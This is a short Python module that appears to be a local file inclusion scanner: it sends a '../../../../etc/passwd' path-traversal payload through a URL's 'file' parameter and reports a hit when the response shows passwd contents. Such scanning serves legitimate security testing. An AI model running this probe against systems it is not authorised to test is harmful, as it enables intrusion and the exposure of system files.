import requests

payloads = ["../../../../etc/passwd"]

def scan(url):
    results = []

    for payload in payloads:
        test_url = f"{url}?file={payload}"

        try:
            r = requests.get(test_url, timeout=5)

            if "root:x:" in r.text:
                results.append({
                    "type": "LFI",
                    "url": test_url
                })

        except:
            pass

    return results
